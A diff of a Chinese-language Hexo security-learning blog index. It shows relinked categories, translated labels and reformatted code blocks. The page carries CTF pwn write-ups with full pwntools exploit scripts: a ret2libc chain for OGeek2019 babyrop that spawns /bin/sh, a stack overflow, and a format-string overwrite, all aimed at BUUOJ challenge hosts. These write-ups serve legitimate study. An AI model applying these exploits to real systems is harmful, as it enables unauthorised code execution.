@@ -7,9 +7,7 @@
   <meta http-equiv="expires" content="0">
   
   <title>Pdxbshx</title>
-  <meta name="author" content="pdxbshx">
-  
-  <meta name="description" content="不需要去抱怨什么|">
+  <meta name="author" content="John Doe">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -95,12 +93,6 @@
 			</a>
 		  </li>
 		  
-		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
-			  <i class="fa fa-user"></i>RSS
-			</a>
-		  </li>
-		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -139,7 +131,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/uncategorized/[OGeek2019]babyrop/" >(OGeek2019)babyrop</a>
+			<a href="/ret2libc/[OGeek2019]babyrop/" >(OGeek2019)babyrop</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -160,12 +152,37 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005808197.png" alt="image-20230809005808197"></p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005823231.png" alt="image-20230809005823231"></p>
 <p>程序主要实现的功能就是打开&#x2F;dev&#x2F;urandom取出一个随机字符串，read(fd,&amp;buf,4u)是把fd所指向的随机字符串写入到buf文件中，长度是4个字节，v6&#x3D;read(0,buf,0x20u)是将终端输入的0x20个字节读取到buf中，将buf和随机的字符串比较，如果相等就退出程序，不相等就返回v5的值，但是这个函数没有对v5进行处理，可以使用栈溢出，对v5进行赋值，v5的值决定了下一个函数对read在终端读取的字节数，通过对buf局部变量实现栈溢出，构造的exp如下所示：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25845</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">buf = <span class="string">b&quot;\0&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7</span>-<span class="number">1</span>)+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">io.sendline(buf)</span><br><span class="line">io.recvline()</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">io.sendline(buf)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(sys_addr)+p32(<span class="number">1</span>)+p32(binsh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25845</span><span class="token punctuation">)</span>
+<span class="token comment">#io = process('./pwn')</span>
+buf <span class="token operator">=</span> <span class="token string">b"\0"</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\xff'</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+main_addr <span class="token operator">=</span> <span class="token number">0x8048825</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>
+libc_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+sys_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>得到的结果如下所示：</p>
 	
 	</div>
-  <a type="button" href="/uncategorized/[OGeek2019]babyrop/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/ret2libc/[OGeek2019]babyrop/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -175,7 +192,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/uncategorized/C、C++/" >C/C++</a>
+			<a href="/C-C/C、C++/" >C/C++</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -189,14 +206,39 @@
   <div class="row">
 	
 	
-		<h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><h2 id="1、数组作为函数参数会被退化为指针"><a href="#1、数组作为函数参数会被退化为指针" class="headerlink" title="1、数组作为函数参数会被退化为指针"></a>1、数组作为函数参数会被退化为指针</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> ElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="keyword">typedef</span> ElemType SqBinTree[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateBTree</span><span class="params">(SqBinTree a,ElemType b[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">sizeof</span>(b)/<span class="built_in">sizeof</span>(ElemType);i++)&#123;</span><br><span class="line">        a[i]=b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqBinTree a;</span><br><span class="line">    ElemType b[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">//int len;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个二叉树: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,b);</span><br><span class="line">    <span class="comment">//len = sizeof(b)/sizeof(ElemType);</span></span><br><span class="line">    <span class="built_in">CreateBTree</span>(a,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">sizeof</span>(b)/<span class="built_in">sizeof</span>(ElemType);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+		<h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><h2 id="1、数组作为函数参数会被退化为指针"><a href="#1、数组作为函数参数会被退化为指针" class="headerlink" title="1、数组作为函数参数会被退化为指针"></a>1、数组作为函数参数会被退化为指针</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
+<span class="token keyword">typedef</span> <span class="token keyword">char</span> ElemType<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MaxSize</span> <span class="token expression"><span class="token number">100</span></span></span>
+<span class="token keyword">typedef</span> ElemType SqBinTree<span class="token punctuation">[</span>MaxSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">CreateBTree</span><span class="token punctuation">(</span>SqBinTree a<span class="token punctuation">,</span>ElemType b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ElemType<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    SqBinTree a<span class="token punctuation">;</span>
+    ElemType b<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token comment">//int len;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入一个二叉树: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//len = sizeof(b)/sizeof(ElemType);</span>
+    <span class="token function">CreateBTree</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ElemType<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230502162911210.png" alt="image-20230502162911210"></p>
 <h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>C&#x2F;C++中如果一个函数接收一个数组作为参数，那么数组将会被退化为指针。</p>
 <h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果实在想用**sizeof(b)&#x2F;sizeof(ELemType)**计算出数组的长度，可以现在main()函数里面进行计算，然后再将长度给入到函数中。</p>
 	
 	</div>
-  <a type="button" href="/uncategorized/C、C++/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/C-C/C、C++/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -206,7 +248,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/uncategorized/Java基础学习/" >Java学习</a>
+			<a href="/Java/Java基础学习/" >Java学习</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -229,7 +271,7 @@
 <h1 id="java-API文档"><a href="#java-API文档" class="headerlink" title="java API文档"></a>java API文档</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003818106.png" alt="image-20230419003818106"></p>
 	
 	</div>
-  <a type="button" href="/uncategorized/Java基础学习/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/Java/Java基础学习/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -261,7 +303,7 @@
 <h2 id="漏洞的复现"><a href="#漏洞的复现" class="headerlink" title="漏洞的复现"></a>漏洞的复现</h2><h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3>
 	
 	</div>
-  <a type="button" href="/uncategorized/第一次作业/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/uncategorized/第一次作业/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -294,7 +336,7 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221208235359065.png" alt="image-20221208235359065"></p>
 	
 	</div>
-  <a type="button" href="/uncategorized/第二次作业/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/uncategorized/第二次作业/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -304,7 +346,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/uncategorized/第八周笔记/" >第八周笔记</a>
+			<a href="/系统调用-UAF/第八周笔记/" >第八周笔记</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -328,7 +370,7 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-5.png"></p>
 	
 	</div>
-  <a type="button" href="/uncategorized/第八周笔记/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/系统调用-UAF/第八周笔记/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -338,7 +380,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/uncategorized/linux下的系统调用/" >linux下的系统调用</a>
+			<a href="/系统调用/linux下的系统调用/" >linux下的系统调用</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -363,7 +405,7 @@
 <p>这里举个例子，我们c语言使用下的printf函数，它的内部其实就是通过write这个系统调用，让操作系统内核将我们输入的字符打印在屏幕上。</p>
 	
 	</div>
-  <a type="button" href="/uncategorized/linux下的系统调用/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/系统调用/linux下的系统调用/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -408,7 +450,7 @@
 <h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3>
 	
 	</div>
-  <a type="button" href="/uncategorized/栈与堆的深入理解/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/uncategorized/栈与堆的深入理解/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -438,13 +480,20 @@
 <p>为64位程序，然后没有开启canary保护，将其放入ida中进行反编译：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-2.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-3.png"></p>
 <p>整个函数的结构比较简单，直接就是简单的栈溢出，构造的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">goodgame_addr=<span class="number">0x00400620</span></span><br><span class="line">p=process(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28897</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(goodgame_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+goodgame_addr<span class="token operator">=</span><span class="token number">0x00400620</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./guestbook'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28897</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>goodgame_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>打通的结果如下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-4.png"></p>
 	
 	</div>
-  <a type="button" href="/uncategorized/第七周笔记/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/uncategorized/第七周笔记/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -473,14 +522,21 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-2.png"></p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-3.png"></p>
 <p>很明显，system函数直接暴露在了我们的面前，只需要x满足等于4时即可，通过观察发现x为一个全局变量，我们通过多次运行程序，发现x的默认值为3，接下来的操作主要是找到x的地址，然后将其修改成4即可，这里与之前不同的是，我们在这次用到了fmtstr_payload(偏移，{adds1：value1})，这是32位程序常用的方法，可以构造的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26987</span>)</span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;x_addr:<span class="number">0x4</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./fm'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26987</span><span class="token punctuation">)</span>
+x_addr <span class="token operator">=</span> <span class="token number">0x0804A02C</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>x_addr<span class="token punctuation">:</span><span class="token number">0x4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最终打通的结果如下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-4.png"></p>
 <h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2>
 	
 	</div>
-  <a type="button" href="/uncategorized/第六周笔记/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/uncategorized/第六周笔记/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -494,12 +550,12 @@
 
    
     
-           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
         
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-       <a href="/page/2/" type="button" class="btn btn-default ">下一页<i class="fa fa-arrow-circle-o-right"></i></a>     
+       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
         
 
   
@@ -519,7 +575,7 @@
 			
   <div id="site_search">
    <div class="form-group">
-    <input type="text" id="local-search-input" name="q" results="0" placeholder="搜索" class="st-search-input st-default-search-input form-control"/>
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
    </div>  
   <div id="local-search-result"></div>
   </div>
@@ -527,11 +583,34 @@
 
 		
 			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/C-C/">C/C++<span>1</span></a></li>
+		
+			<li><a href="/categories/Java/">Java<span>1</span></a></li>
+		
+			<li><a href="/categories/ret2dl-resolve-ret2VDSO/">ret2dl_resolve,ret2VDSO<span>1</span></a></li>
+		
+			<li><a href="/categories/ret2libc/">ret2libc<span>1</span></a></li>
+		
+			<li><a href="/categories/系统调用/">系统调用<span>1</span></a></li>
+		
+			<li><a href="/categories/系统调用-UAF/">系统调用,UAF<span>1</span></a></li>
+		
+		</ul>
+	</div>
+
 		
 			
 	<div class="widget">
-		<h4>标签云</h4>
+		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/ret2VDSO/">ret2VDSO<span>1</span></a></li>
+		
+			<li><a href="/tags/C-C/">C/C++<span>1</span></a></li>
 		
 			<li><a href="/tags/字符串漏洞/">字符串漏洞<span>1</span></a></li>
 		
@@ -539,27 +618,23 @@
 		
 			<li><a href="/tags/系统调用/">系统调用<span>2</span></a></li>
 		
-			<li><a href="/tags/BlueKeep漏洞/">BlueKeep漏洞<span>1</span></a></li>
-		
 			<li><a href="/tags/ret2dl-resolve/">ret2dl_resolve<span>1</span></a></li>
-		
-			<li><a href="/tags/栈与堆/">栈与堆<span>1</span></a></li>
-		
